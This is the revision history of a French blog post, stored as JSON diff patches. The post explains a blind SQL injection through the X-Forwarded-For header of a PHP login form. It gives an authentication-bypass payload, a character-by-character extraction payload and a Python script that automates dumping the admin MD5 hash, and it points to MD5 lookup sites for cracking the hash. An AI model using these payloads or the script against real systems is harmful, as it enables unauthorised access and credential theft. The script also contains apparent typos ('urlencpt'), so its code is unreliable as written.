{"ts":1376843650242,"silentsave":true,"restoring":false,"patch":[[]],"length":0}
{"contributors":[],"silentsave":false,"ts":1376843674289,"patch":[[{"diffs":[[1,"---\r\nlayout: post\r\ntitle: Blind SQL injection via un header HTTP\r\ndate: 2011-07-21 14:29\r\ncategories: hacking\r\ncomments: true\r\nphoto: sqli_http_header.png\r\ndescription: Cet article présente une façon originale d'exploiter une faille de type injection SQL.\r\n---\r\n\r\nCet article présente une façon originale d'exploiter une faille de type injection SQL. La faille se trouve dans un formulaire d'identification et plus précisément dans le code PHP qui ne contrôle pas tous les paramètres de la requête SQL.\r\n\r\nLe code PHP est le suivant :\r\n\r\n{% highlight php %}\r\n<?php\r\n$req = mysql_query(\"SELECT login,pwd FROM administrators\r\n                    WHERE login='\".sanitize($_POST['login']).\"'\r\n                    AND pwd='\".md5($_POST['password']).\"'\r\n                    AND ip='\".ip().\"'\");\r\n?>\r\n{% endhighlight %}\r\n\r\nLa variable login est correctement contrôlée grâce à la fonction _sanitize()_ :\r\n\r\n{% highlight php %}\r\n<?php\r\nfunction sanitize($param){\r\n    if (is_numeric($param)){\r\n    \treturn $param;\r\n\t}\r\n\telse{\r\n\t\treturn mysql_real_escape_string($param);\r\n\t}\r\n}\r\n?>\r\n{% endhighlight %}\r\n\r\nEt le mot de pass est directement converti en MD5, rien à faire de ce coté là. Intéressons nous au paramète \"IP\" et plus particulièrement à la fonction ip()_.\r\n\r\n{% highlight php %}\r\n<?php\r\nfunction ip(){\r\n    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])){\r\n\t\t$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];\r\n    }\r\n\telse{\r\n\t\t$ip = $_SERVER[\"REMOTE_ADDR\"];\r\n    }\r\n\r\n\tif (preg_match(\"#^[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}\\.[0-9]{1,3}#\",$ip)){\r\n\t\treturn $ip;\r\n\t}\r\n\telse{\r\n\t\treturn $_SERVER[\"REMOTE_ADDR\"];\r\n\t}\r\n}\r\n{% endhighlight %}\r\n\r\nOn remarque que la récupération de l'adresse ip repose sur un header HTTP _X_FORWARDED_FOR_ et que le seul contrôle effectué est un _preg_match_ qui permet de vérifier que le paramètre contient bien au moins une adresse ip. Il est alors possible d'injecter du code SQL dans le header HTTP afin de bypasser l'identification voir même d'extraire les informations de la BDD.\r\n\r\nEn modifiant le header par :\r\n\r\n    127.0.0.1' or 1=1#\r\n\r\nLa requête est forcément vraie et on se retrouve identifié \\o/\r\n\r\nDe la même manière on va pouvoir récupérer le password de l'administrateur, en effet lorsque la requete est fausse la page affiche \"Mot de passe incorrect\", en effectuant une [blind SQL injection](http://www.ghostsinthestack.org/article-11-blind-sql-injections.html) il est possible de retrouver le mot de passe caractère par caractère, exemple :\r\n\r\n    127.0.0.1' or ascii(substring(pwd,1,1))=48#\r\n\r\nSi la requête est vraie et donc que l'on se retrouve identifié alors cela veut dire que le premier caractère du mot de passe est \"0\" (48 en ascii)\r\n\r\nJ'ai écrit un petit script en python (mon premier) qui permet d'automatiser tout cela :\r\n\r\n{% highlight python %}\r\nimport httplib\r\nimport urllib\r\nimport re\r\n\r\npassword = \"\"\r\n\r\nmd5 = ['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f']\r\ncpt = 0\r\ni = 1\r\n\r\nwhile i<=32:\r\n\r\n\tprint 'Recherche du caractère '+str(i)\r\n\tif cpt == 16:\r\n\t\tcpt = 0\r\n\r\n\tprint 'Test caractere : '+md5[cpt]\r\n\tparams = urllib.urlencpt({'login': 'admin', 'pwd': 'password'})\r\n\theaders = {\"Content-type\": \"application/x-www-form-urlencptd\",\r\n               \"Accept\": \"text/plain\",\r\n               \"x-forwarded-for\":\"127.0.0.1' or ascii(substring(pwd,\"+str(i)+\",1))=\"+str(ord(md5[cpt]))+\"#\"}\r\n\tconn = httplib.HTTPConnection(\"www.site.com:80\")\r\n\tconn.request(\"POST\", \"/index.php\", params, headers)\r\n\tresponse = conn.getresponse()\r\n\tprint response.status, response.reason\r\n\tdata = response.read()\r\n\tconn.close()\r\n\r\n\tif not(re.search('incorrect',data)):\r\n\t\tprint 'Caractère trouvé : '+md5[cpt]\r\n\t\tpassword += md5[cpt]\r\n\t\ti += 1\r\n\t\tcpt = 0\r\n\telse:\r\n\t\tcpt += 1\r\n\r\nprint 'MD5 = '+str(password)\r\n{% endhighlight %}\r\n\r\nEt voila on trouve le hash et un passage par [cmd5.org](http://www.cmd5.org/) ou par [md5decrypter.co.uk](http://www.md5decrypter.co.uk/) nous donne la correspondance. Si vous avez des questions, commentaires n'hésitez pas."]],"start1":0,"start2":0,"length1":0,"length2":3982}]],"length":3982,"saved":false}
{"ts":1376848885039,"patch":[[{"diffs":[[0,"TP\r\n"],[-1,"date: 2011-07-21 14:29\r\ncategories: hacking\r\ncomments: true\r\nphoto: sqli_http_header.png\r\n"],[0,"desc"]],"start1":62,"start2":62,"length1":98,"length2":8},{"diffs":[[0,"n SQL.\r\n"],[1,"categories: hacking\r\ntags: [blind sqlinjection, header http]\r\nphoto: sqli_http_header.png\r\ncomments: true\r\n"],[0,"---\r\n\r\nC"]],"start1":159,"start2":159,"length1":16,"length2":123}]],"length":3999,"saved":false}
{"ts":1376849334071,"patch":[[{"diffs":[[0,"es: "],[-1,"hacking"],[1,"articles"],[0,"\r\nta"]],"start1":175,"start2":175,"length1":15,"length2":16},{"diffs":[[0,"s: ["],[-1,"blind sqlinjection, header http"],[1,"hacking"],[0,"]\r\np"]],"start1":192,"start2":192,"length1":39,"length2":15}]],"length":3976,"saved":false}
